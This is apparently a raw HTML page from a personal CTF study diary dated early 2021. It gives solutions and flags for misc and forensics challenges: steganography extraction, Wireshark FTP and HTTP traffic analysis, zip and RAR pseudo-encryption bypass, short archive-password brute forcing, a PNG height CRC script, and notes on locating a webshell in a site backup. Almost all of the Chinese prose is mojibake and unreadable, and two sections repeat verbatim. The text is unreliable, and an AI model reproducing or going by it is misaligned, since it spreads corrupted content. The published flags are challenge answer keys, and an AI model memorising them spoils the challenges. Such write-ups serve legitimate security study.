æ‰“å¼€å‹ç¼©åŒ…ï¼Œå°±èƒ½å¾—åˆ°flag</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><p>ä¸é”™çš„ä¸€ä¸ªé¢˜</p><h2 id="é¢å…·ä¸‹çš„flag"><a href="#é¢å…·ä¸‹çš„flag" class="headerlink" title="é¢å…·ä¸‹çš„flag"></a>é¢å…·ä¸‹çš„flag</h2><p>å°†å¾—åˆ°å›¾ç‰‡åç¼€æ”¹ä¸ºzipå°±èƒ½è½»æ¾æ‰“å¼€</p><p>å¾—åˆ°æ–‡ä»¶flag.vmdkï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶åå­—ä¸ºnulåœ¨windowsä¸‹é¢æ— æ³•æ˜¾ç¤ºæ”¾åˆ°è™šæ‹Ÿæœºè¯•è¯•</p><pre><code>7z x flag.vmdk -o./tree</code></pre><p>flag{N7F5_AD5_i5_funny!}</p><h1 id="2021-1-23"><a href="#2021-1-23" class="headerlink" title="2021/1/23"></a>2021/1/23</h1><h2 id="webshellåé—¨"><a href="#webshellåé—¨" class="headerlink" title="webshellåé—¨"></a>webshellåé—¨</h2><p>hintï¼šæœ‹å‹çš„ç½‘ç«™è¢«é»‘å®¢ä¸Šä¼ äº†webshellåé—¨ï¼Œä»–æŠŠç½‘ç«™æ‰“åŒ…å¤‡ä»½äº†ï¼Œä½ èƒ½å¸®å¿™æ‰¾åˆ°é»‘å®¢çš„webshellåœ¨å“ªå—ï¼Ÿ(Webshellä¸­çš„å¯†ç (md5)å³ä¸ºç­”æ¡ˆ)ã€‚</p><p>Dç›¾ä¸€æŠŠæ¢­</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><h2 id="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"><a href="#è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©" class="headerlink" title="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"></a>è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©</h2><p>hintï¼šæŸå¤©å°æ˜æ”¶åˆ°äº†ä¸€ä»¶å¾ˆç‰¹åˆ«çš„ç¤¼ç‰©ï¼Œæœ‰å¥‡æ€ªçš„åç¼€ï¼Œå¥‡æ€ªçš„åå­—å’Œæ ¼å¼ã€‚å°æ˜æ‰¾åˆ°äº†çŸ¥å¿ƒå§å§åº¦å¨˜ï¼Œåº¦å¨˜å¥½åƒçŸ¥é“è¿™æ˜¯å•¥ï¼Œä½†æ˜¯åº¦å¨˜ä¹Ÿä¸çŸ¥é“é‡Œé¢æ˜¯å•¥ã€‚ã€‚ã€‚ä½ å¸®å¸®å°æ˜ï¼Ÿæ‰¾åˆ°å¸å·å¯†ç ï¼Œä¸²åœ¨ä¸€èµ·ï¼Œç”¨32ä½å°å†™MD5å“ˆå¸Œä¸€ä¸‹å¾—åˆ°çš„å°±æ˜¯ç­”æ¡ˆã€‚</p><p>å¾—åˆ°çš„æ–‡ä»¶ç”¨wiresharkæ‰“å¼€è¿‡æ»¤åªçœ‹HTTP</p><p>çœ‹åˆ°loginæ•°æ®åŒ…ï¼ŒæŸ¥çœ‹åˆ†ç»„å­—èŠ‚æµå‘ç°ï¼šname=admina&amp;word=adminb</p><p>adminaadminbæœç´¢åœ¨çº¿md5hashæˆ–è€…æœ¬åœ°å·¥å…·hash</p><p>flag{1d240aafe21a86afc11f38a45b541a49}</p><h2 id="åˆ·æ–°è¿‡çš„å›¾ç‰‡"><a href="#åˆ·æ–°è¿‡çš„å›¾ç‰‡" class="headerlink" title="åˆ·æ–°è¿‡çš„å›¾ç‰‡"></a>åˆ·æ–°è¿‡çš„å›¾ç‰‡</h2><p>çŸ¥è¯†ç‚¹ï¼šF5éšå†™</p><p>kaliä¸­å®‰è£…F5-steganography å·¥å…·</p><pre><code>git clone https://github.com/matthewgao/F5-steganography</code></pre><p>è§£å¯†çš„æ—¶å€™è¾“å…¥ï¼š</p><pre><code>java Extract /å›¾ç‰‡çš„ç»å¯¹è·¯å¾„ [-p å¯†ç ] [-e è¾“å‡ºæ–‡ä»¶]</code></pre><p>æ­¤å¤„è¦ç²˜è´´æ–‡ä»¶åï¼Œç„¶åå¾—åˆ°æ–‡ä»¶output.txtï¼Œæ‰“å¼€æ–‡æœ¬å‘ç°æœ‰pkå­—æ ·ï¼ŒåŸºæœ¬å°±å¯ä»¥ç¡®å®šæ˜¯zipï¼Œæ‰€æœ‰ä¸éœ€è¦hxdæ‰“å¼€ï¼Œå¾—åˆ°flagï¼šflag{96efd0a2037d06f34199e921079778ee}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>æ”¹ä¸ºzipæ–‡ä»¶å¾—åˆ°keyï¼Œcipherï¼ˆå¯†ç ï¼‰æ–‡ä»¶</p><p>key.txtæ‰“å¼€å¾—åˆ°ï¼šV2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p><p>base64è§£ç åå¾—åˆ°ï¼šWhat is Nicki Minajâ€™s favorite song that refers to snakes?ï¼ˆå¦®çªÂ·ç±³å¨œæœ€å–œæ¬¢çš„ä¸€é¦–æåˆ°è›‡çš„æ­Œæ˜¯ä»€ä¹ˆï¼Ÿï¼‰ç™¾åº¦å¾—åˆ°å·¨èŸ’ï¼šanacondaï¼ˆè¿™ä¸ªmvååˆ†çš„å¸¦åŠ²ï¼ï¼ï¼ï¼ï¼‰</p><p><del>çœ‹å®Œwpå¾—çŸ¥ï¼š</del>è”æƒ³åˆ°ä»¥è›‡å‘½åçš„åŠ å¯†ç®—æ³•Serpentã€‚ä»¥anacondaä¸ºå¯†é’¥ï¼Œç”¨<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">åœ¨çº¿å·¥å…·</a>å¯¹cipherè¿›è¡Œè§£å¯†ã€‚</p><p>é€‰æ‹©é’ˆå¯¹æ–‡ä»¶çš„è§£å¯†ï¼Œkeyå°±æ˜¯anacondaï¼Œæœ€åå¾—åˆ°flagï¼š</p><p>CTF{who_knew_serpent_cipher_existed}</p><h1 id="2021-1-24"><a href="#2021-1-24" class="headerlink" title="2021/1/24"></a>2021/1/24</h1><p>ctfshowå¤§å‰å¤§åˆ©æ¯</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="BJDCTF-2nd-åœ£ç«æ˜­æ˜­-y1ng"><a href="#BJDCTF-2nd-åœ£ç«æ˜­æ˜­-y1ng" class="headerlink" title="[BJDCTF 2nd]åœ£ç«æ˜­æ˜­-y1ng"></a>[BJDCTF 2nd]åœ£ç«æ˜­æ˜­-y1ng</h2><p>é¢˜ç›®ï¼šå¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é <strong>çŒœ</strong></p><p>å› ä¸ºå‡ºé¢˜äººå¤±è¯¯æé”™äº†ï¼Œè§£å‡ºæ¥çš„keyå»æ‰å3ä½çš„com</p><p>å³é”®å±æ€§ï¼Œè¯¦ç»†ä¿¡æ¯ï¼šæ–°ä½›æ›°ï¼šè«¸å£½éš¸åƒ§å£½é™å½å£½è«¸å£½é™€å£½æ‘©éš¸åƒ§ç¼½è–©é¡˜å¿ƒå£½å’¤å£½å›‰å¯‚å£½é—è«¸å£½å“†å£½æ…§å£½èå£½è‰²å½æ„å£½æ‰€å£½èœœå¦‚</p><p>è§£å¾—ï¼šgemlove</p><p>å†æ ¹æ®é¢˜ç›®ä¸­åŠ ç²—çš„<strong>çŒœ</strong>å­—ï¼Œå°è¯•ä½¿ç”¨outguessã€‚</p><pre><code>git clone https://github.com/crorvick/outguess.gitcd outguess./configure &amp;&amp; make &amp;&amp; make installoutguess -k gemlove -r &#39;/root/outguess/CTF/sheng_huo_zhao_zhao.jpg&#39; flag.txtlscat flag.txtBJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></pre><p>æŒ‰ç…§wpæ¥å°±è¡Œ</p><h2 id="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥ï¼ˆæ°´æ–‡ï¼‰"><a href="#æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥ï¼ˆæ°´æ–‡ï¼‰" class="headerlink" title="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥ï¼ˆæ°´æ–‡ï¼‰"></a>æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥ï¼ˆæ°´æ–‡ï¼‰</h2><p>ä¸¤ç§è§£æ³•éƒ½å¤±è´¥ï¼Œè¿™é‡Œåªè®°å½•ä¸€ç§ç®€å•çš„åšæ³•ï¼š</p><p>hxdæ‰“å¼€çœ‹è§Ã¿Ã™ï¼ˆff d9ï¼‰æ˜¯16è¿›åˆ¶å¼€å¤´çš„æ•°å­—ï¼Œè½¬ç ascâ…¡å¾—åˆ°ç¥ç§˜å°åæ ‡</p><p>gnuplotä½¿ç”¨æ­¥éª¤</p><p>1.ç»ˆç«¯è¾“å…¥gnuplot</p><p>2.è¿›å…¥åè¾“å…¥plot ï¼Œæ–‡ä»¶ç›´æ¥æ‹–è¿›å»</p><p>3.å¯ä»¥ç›´æ¥çœ‹åˆ°å›¾äº†</p><p>æ–‡ä»¶æ ¼å¼åªéœ€è¦ç•™ä¸‹é€—å·</p><h2 id="èœåˆ€666"><a href="#èœåˆ€666" class="headerlink" title="èœåˆ€666"></a>èœåˆ€666</h2><p>å¾—åˆ°æ–‡ä»¶åç¼€ï¼špcapngï¼Œwiresharkæ‰“å¼€</p><p>å¾…è§£ã€‚</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><h2 id="å°‘äº†ä¸€åŠï¼Ÿï¼Ÿ-é¢˜ç›®æ¥è‡ªstarsnow"><a href="#å°‘äº†ä¸€åŠï¼Ÿï¼Ÿ-é¢˜ç›®æ¥è‡ªstarsnow" class="headerlink" title="å°‘äº†ä¸€åŠï¼Ÿï¼Ÿ(é¢˜ç›®æ¥è‡ªstarsnow)"></a>å°‘äº†ä¸€åŠï¼Ÿï¼Ÿ(é¢˜ç›®æ¥è‡ªstarsnow)</h2><p>å¾—åˆ°çš„æ˜¯jpgæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A51537_1.png" alt></p><p>è¿™é‡Œå°†é»‘è‰²æ ‡è®°çš„41æ”¹ä¸ºEEå¾—åˆ°flag</p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>å­¦ä¹ php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP è¯­æ³•</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP å˜é‡</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP æ•°æ®ç±»å‹</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP ç±»å‹æ¯”è¾ƒ</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP å¸¸é‡</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP å­—ç¬¦ä¸²</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP è¿ç®—ç¬¦</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP Ifâ€¦Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP æ•°ç»„</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP æ•°ç»„æ’åº</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP è¶…çº§å…¨å±€å˜é‡</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While å¾ªç¯</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For å¾ªç¯</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP å‡½æ•°</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>é»‘é©¬æ•™ç¨‹-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>é»‘é©¬æ•™ç¨‹p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><p>é»‘é©¬æ•™ç¨‹p70+16=p86</p><h2 id="è¢«å·èµ°çš„æ–‡ä»¶"><a href="#è¢«å·èµ°çš„æ–‡ä»¶" class="headerlink" title="è¢«å·èµ°çš„æ–‡ä»¶"></a>è¢«å·èµ°çš„æ–‡ä»¶</h2><p>å¾—åˆ°æˆ‘æ–‡ä»¶ç”¨wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤å‡ºftpæ–‡ä»¶ä¼ è¾“åè®®ï¼Œå³é”®è¿½è¸ªæµç‚¹å‡»tcpå‘ç°äº†flag.rarï¼Œç”¨foremostè·‘ä¸€ä¸‹ï¼Œå¾—åˆ°rarå‹ç¼©åŒ…ï¼Œå››ä½æ•°çˆ†ç ´å¾—åˆ°å¯†ç 5790ï¼Œæ‰“å¼€å¾—åˆ°flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†"><a href="#BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†" class="headerlink" title="[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†"></a>[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†</h2><p>å¾—åˆ°æ–‡ä»¶10.xlsï¼Œæ‰“å¼€ä»¥åæˆ‘å¾—åˆ°æ˜¯ä¹±ç ï¼Œä½†æ˜¯åœ¨æ–‡ä»¶å¤´çœ‹è§pkå­—èŠ‚æ˜¯zipå‹ç¼©åŒ…çš„æ ‡å‡†ï¼Œäºæ˜¯ç”¨foremostæ‰“å¼€è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°å‹ç¼©åŒ…ï¼Œæ‰“å¼€å³å¯æ‰¾åˆ°flag.txt</p><h2 id="è¢«å·èµ°çš„æ–‡ä»¶-1"><a href="#è¢«å·èµ°çš„æ–‡ä»¶-1" class="headerlink" title="è¢«å·èµ°çš„æ–‡ä»¶"></a>è¢«å·èµ°çš„æ–‡ä»¶</h2><p>å¾—åˆ°æˆ‘æ–‡ä»¶ç”¨wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤å‡ºftpæ–‡ä»¶ä¼ è¾“åè®®ï¼Œå³é”®è¿½è¸ªæµç‚¹å‡»tcpå‘ç°äº†flag.rarï¼Œç”¨foremostè·‘ä¸€ä¸‹ï¼Œå¾—åˆ°rarå‹ç¼©åŒ…ï¼Œå››ä½æ•°çˆ†ç ´å¾—åˆ°å¯†ç 5790ï¼Œæ‰“å¼€å¾—åˆ°flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†-1"><a href="#BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†-1" class="headerlink" title="[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†"></a>[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†</h2><p>å¾—åˆ°æ–‡ä»¶10.xlsï¼Œæ‰“å¼€ä»¥åæˆ‘å¾—åˆ°æ˜¯ä¹±ç ï¼Œä½†æ˜¯åœ¨æ–‡ä»¶å¤´çœ‹è§pkå­—èŠ‚æ˜¯zipå‹ç¼©åŒ…çš„æ ‡å‡†ï¼Œäºæ˜¯ç”¨foremostæ‰“å¼€è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°å‹ç¼©åŒ…ï¼Œæ‰“å¼€å³å¯æ‰¾åˆ°flag.txt</p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>é»‘é©¬æ•™ç¨‹p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="BJDCTF2020-è—è—è—"><a href="#BJDCTF2020-è—è—è—" class="headerlink" title="[BJDCTF2020]è—è—è—"></a>[BJDCTF2020]è—è—è—</h2><p>å¾—åˆ°jpgï¼Œå°†åç¼€æ”¹ä¸ºzipï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œç”¨qr researchæ‰«æä¸€ä¸‹å¾—åˆ°flag{you are the best!}</p><h2 id="GXYCTF2019-ä½›ç³»é’å¹´"><a href="#GXYCTF2019-ä½›ç³»é’å¹´" class="headerlink" title="[GXYCTF2019]ä½›ç³»é’å¹´"></a>[GXYCTF2019]ä½›ç³»é’å¹´</h2><p>å¾—åˆ°å‹ç¼©åŒ…ï¼Œæ˜¾ç¤ºä¸€éƒ¨ä¼ªåŠ å¯†ï¼Œä»504B0102å¼€å§‹è®¡ç®—ï¼Œç¬¬ä¹ç¬¬åä¸ªå­—ç¬¦ä¸ºåŠ å¯†å­—æ®µï¼Œå°†å…¶è®¾ç½®ä¸º0000å³å¯å˜æˆæ— åŠ å¯†çŠ¶æ€ã€‚50ä¸‹é¢æ•°5ï¼Œ6è¡Œçš„ä½ç½®ï¼Œ14000900ï¼Œå°†9æ”¹ä¸º0ï¼Œç ´è§£ä¼ªåŠ å¯†ï¼Œå¾—åˆ°ä½›æ–‡ï¼Œæ—§ä½›æ›°è§£å¯†ï¼ˆå¸¦ä¸Šä½›æ›°äºŒå­—ï¼‰å¾—ï¼šflag{w0_fo_ci_Be1}</p><p>è¡¥å……ï¼š.RARæ–‡ä»¶ç”±äºæœ‰å¤´éƒ¨æ ¡éªŒï¼Œä½¿ç”¨ä¼ªåŠ å¯†æ—¶æ‰“å¼€æ–‡ä»¶ä¼šå‡ºç°æŠ¥é”™ï¼Œä½¿ç”¨winhexä¿®æ”¹æ ‡å¿—ä½åå¦‚æŠ¥é”™æ¶ˆå¤±ä¸”æ­£å¸¸è§£å‹ç¼©ï¼Œè¯´æ˜æ˜¯ä¼ªåŠ å¯†ã€‚ä½¿ç”¨winhexæ‰“å¼€RARæ–‡ä»¶ï¼Œæ‰¾åˆ°ç¬¬24ä¸ªå­—èŠ‚ï¼Œè¯¥å­—èŠ‚å°¾æ•°ä¸º4è¡¨ç¤ºåŠ å¯†ï¼Œ0è¡¨ç¤ºæ— åŠ å¯†ï¼Œå°†å°¾æ•°æ”¹ä¸º0å³å¯ç ´è§£ä¼ªåŠ å¯†ã€‚</p><h1 id="2021-02-03-ç«‹æ˜¥"><a href="#2021-02-03-ç«‹æ˜¥" class="headerlink" title="2021-02-03(ç«‹æ˜¥)"></a>2021-02-03(ç«‹æ˜¥)</h1><h2 id="ç§˜å¯†æ–‡ä»¶"><a href="#ç§˜å¯†æ–‡ä»¶" class="headerlink" title="ç§˜å¯†æ–‡ä»¶"></a>ç§˜å¯†æ–‡ä»¶</h2><p>å¼•å­ï¼šæ·±å¤œé‡Œï¼ŒHackå·å·çš„æ½œå…¥äº†æŸå…¬å¸çš„å†…ç½‘ï¼Œè¶ç€æ·±å¤œå·èµ°äº†å…¬å¸çš„ç§˜å¯†æ–‡ä»¶ï¼Œå…¬å¸çš„ç½‘ç»œç®¡ç†å‘˜é€šè¿‡é€šè¿‡ç›‘æ§å·¥å…·æˆåŠŸçš„æˆªå–Hackå…¥ä¾µæ—¶æ•°æ®æµé‡ï¼Œä½†æ˜¯å´æ— æ³•åˆ†æå‡ºHackåˆ°åº•å·èµ°äº†ä»€ä¹ˆæœºå¯†æ–‡ä»¶ï¼Œä½ èƒ½å¸®å¸®ç®¡ç†å‘˜åˆ†æå‡ºHackåˆ°åº•å·èµ°äº†ä»€ä¹ˆæœºå¯†æ–‡ä»¶å—ï¼Ÿ</p><p>wiresharkæ‰“å¼€è¿½è¸ªftpæ–‡ä»¶ä¼ è¾“åè®®çš„æµçš„å¾—åˆ°å°å·ç›—èµ°çš„æ˜¯ï¼š6b0341642a8ddcbeb7eca927dae6d541.rarå‹ç¼©åŒ…</p><p>æ‰€ä»¥å°è¯•ä½¿ç”¨foremoståˆ†ç¦»ä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…çˆ†ç ´å¾—åˆ°å¯†ç 1903ï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶å°±æ˜¯ 6b0341642a8ddcbeb7eca927dae6d541.txtï¼Œæ‰€ä»¥ä¸Šé¢å’±åˆ†æçš„æ²¡é”™ï¼Œä½†æ˜¯æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œåˆ†ç¦»ä¸€æ­¥å¤šæ­¤ä¸€ä¸¾</p><h2 id="BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"><a href="#BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥" class="headerlink" title="[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"></a>[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥</h2><p>å¾—åˆ°å‹ç¼©åŒ…ï¼Œç›´æ¥å‹ç¼©åŒ…æŸåï¼Œæˆ‘ç›´æ¥è§‰å¾—æ˜¯ä¼ªåŠ å¯†ï¼Œæ‰“å¼€ä¸€çœ‹ä¸€ç‚¹zipçš„æ ·å­éƒ½æ²¡æœ‰ï¼Œæ˜¯pngï¼Œç›´æ¥å¾—åˆ°ä¸€å¼ äºŒç»´ç qrä¸€æ‰«ï¼Œè·Ÿæˆ‘è¯´flagä¸åœ¨è¿™ï¼Œé‚£ä¹ˆforemostå†ä¸€è·‘ï¼Œæ²¡ä¸œè¥¿ã€‚stesolveä¹Ÿæ²¡ä¸œè¥¿ï¼Œè®©æˆ‘æƒ³èµ·æ¥äº†ç”¨winhexå‘ç°çš„flagï¼Œååˆ†ä¸åƒå› ä¸ºè¿™æ ·çš„è¯å°±å¤ªã€‚ã€‚ç®€å•äº†ï¼Œä½†æ˜¯å°±æ˜¯ä»–ã€‚ã€‚ã€‚ã€‚</p><p>flag{i_am_fl@g}</p><h2 id="SWPU2019-ç¥å¥‡çš„äºŒç»´ç "><a href="#SWPU2019-ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="[SWPU2019]ç¥å¥‡çš„äºŒç»´ç "></a>[SWPU2019]ç¥å¥‡çš„äºŒç»´ç </h2><p>188kbåšä¸ºä¸€å¼ ç®€å•çš„äºŒç»´ç ï¼Œä½ å¤ªå¤§äº†ï¼Œæ”¹ä¸ºzipæ–‡ä»¶å¾—åˆ°æ–‡æœ¬encodeï¼Œå†…å®¹æ˜¯base64ï¼Œè§£ç å¾—åˆ°ï¼šasdfghjkl1234567890ï¼Œè¿™åº”è¯¥ä¸æ˜¯flagï¼Œbinwalk -e 123.rar</p><p>ä»å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å¾—åˆ°ä¸€å¤§ä¸²baseåŠ å¯†çš„ï¼Œpythonå®ç°è‡ªåŠ¨è§£ç base64å¾—åˆ°ï¼šcomEON_YOuAreSOSoS0great</p><p>å¾—åˆ°mp3æ–‡ä»¶ï¼Œæ˜¯è«æ–¯ç”µç ï¼šmorseisveryveryeasyâ†è½¬ç å¾—åˆ°ï¼Œflag{morseisveryveryeasy}</p><h1 id="2021-02-04-å°å¹´"><a href="#2021-02-04-å°å¹´" class="headerlink" title="2021-02-04(å°å¹´)"></a>2021-02-04(å°å¹´)</h1><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p>æ³¨æ„åŠ›æ³¨æ„äº†ï¼Œæ–°æ€è·¯ï¼ï¼</p><p>å‡½æ•°ï¼š</p><p>php hex2bin()å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦</p><p>åŠŸèƒ½ï¼šäº¤é”™ï¼Œå°†ä¸€å¼ å›¾ç‰‡ç›–åˆ°å¦ä¸€å¼ å›¾ç‰‡ä¸Šï¼Œå¯ä»¥ä½¿ç”¨åäº¤é”™åŠŸèƒ½è¿›è¡Œè§£å†³</p><p>1.file 1.jpgå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹ï¼Œå¯ä»¥å°†æ–‡ä»¶ç±»å‹æ”¹ä¸ºaviå˜æˆä¸€ä¸ªå°è§†é¢‘ï¼Œå…¶åœ¨winhexä¸­çš„å¼€å¤´å‰ç¼€ä¸ºï¼šriff</p><p>2.é‡‡ç”¨è½¯ä»¶è¿›è¡Œåˆ†å¸§å’Œåäº¤é”™å¤„ç†ï¼šKinovea</p><p>3.å¾—åˆ°çš„äºŒç»´ç ä¸æ¸…æ™°ï¼Œé‡‡ç”¨é™ä½äº®åº¦ï¼Œæé«˜å¯¹æ¯”åº¦</p><p>4.å°†æ‰«ç å¾—åˆ°çš„å†…å®¹è¿›è¡Œ16è¿›åˆ¶è½¬asciiç å¾—ï¼š</p><p>125å¸§æ‰«ç å¾—åˆ°ï¼š6167696E5F6Cï¼Œè½¬ç ä¸ºagin_lï¼›129å¸§æ‰«ç å¾—åˆ°ï¼š6F76655F59ï¼Œè½¬ç ä¸ºove_Yï¼›133å¸§æ‰«ç å¾—åˆ°ï¼š424A447B696Dï¼Œè½¬ç ä¸ºBJD{imï¼›136å¸§æ‰«ç å¾—åˆ°ï¼š316E677Dï¼Œè½¬ç ä¸º1ng}ã€‚æ‹¼æ¥å¾—åˆ°BJD{imagin_love_Y1ng}ï¼Œå³ä¸ºflagã€‚</p><h2 id="å±±å¸å°å¹´çº¢åŒ…é¢˜ç›®"><a href="#å±±å¸å°å¹´çº¢åŒ…é¢˜ç›®" class="headerlink" title="å±±å¸å°å¹´çº¢åŒ…é¢˜ç›®"></a>å±±å¸å°å¹´çº¢åŒ…é¢˜ç›®</h2><p>1.å¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°Sir Your Plane Will Arrive At (2p. m. )</p><p>2.foremoståˆ†ç¦»å¾—åˆ°zipï¼Œå¯†ç é‡‡ç”¨çˆ†ç ´è‡ªå®šä¹‰çš„å­—ç¬¦ä¸²ï¼šsypwaa1400å¾—åˆ°å¯†ç </p><p>3.å¾—åˆ°01äºŒè¿›åˆ¶ï¼Œé¢˜ç›®åå­—ä¸ºqr_codeæ‰€ä»¥è”æƒ³åˆ°äºŒè¿›åˆ¶è½¬äºŒç»´ç é€šè¿‡è„šæœ¬ï¼ˆä½¿ç”¨å‰è¦pip install pillowï¼Œå¦åˆ™æ— æ³•è¿è¡Œpilç‰ˆå—ï¼‰ï¼š</p><pre><code>from PIL import ImageMAX = 21width = 25height = 25pic = Image.new(&quot;RGB&quot;,(width, height))str = &quot;&quot;#è¾“å…¥äºŒè¿›åˆ¶i=0for y in range (0,height):    for x in range (0,width):        if(str[i] == &#39;1&#39;):            pic.putpixel([x,y],(0, 0, 0))        else:            pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p>å¾—åˆ°å›¾ç‰‡ä»¥åé€šè¿‡åœ¨çº¿pså¾—åˆ°å®Œæ•´çš„äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p><h1 id="2021-02-05"><a href="#2021-02-05" class="headerlink" title="2021-02-05"></a>2021-02-05</h1><h2 id="BJDCTF2020-ä¸€å¶éšœç›®"><a href="#BJDCTF2020-ä¸€å¶éšœç›®" class="headerlink" title="[BJDCTF2020]ä¸€å¶éšœç›®"></a>[BJDCTF2020]ä¸€å¶éšœç›®</h2><p>éƒ½è¯´æ˜¯ä¸€å¶éšœç›®è€ƒè™‘åˆ°å›¾ç‰‡é«˜åº¦è¢«ä¿®æ”¹ï¼Œé‡‡ç”¨è„šæœ¬è®¡ç®—æ¨¡æ¿(æ³¨æ„éœ€è¦å®‰è£…cyptoæ¨¡æ¿ï¼Œä½†æ˜¯éœ€è¦å®‰è£…på¼€å¤´çš„)ï¼š</p><pre><code>import structimport binasciifrom Crypto.Util.number import bytes_to_longimg = open(&#39;C:/Users/Administrator/Desktop/1.png&#39;, &#39;rb&#39;).read()for i in range(0xFFFF):    stream = img[12:20] + struct.pack(&#39;&gt;i&#39;, i) + img[24:29]    crc = binascii.crc32(stream)    if crc == bytes_to_long(img[29:33]):        print(i, hex(i))</code></pre><p>å¾—åˆ°é«˜åº¦ä¸º844è€Œå…¶16è¿›åˆ¶ä¸º34cæ‰€ä»¥ç»™ä¸º034cå³å¯</p><p>å¾—åˆ°ä¿®æ”¹çš„å›¾ç‰‡ä¸ºxaflag{66666}</p><h2 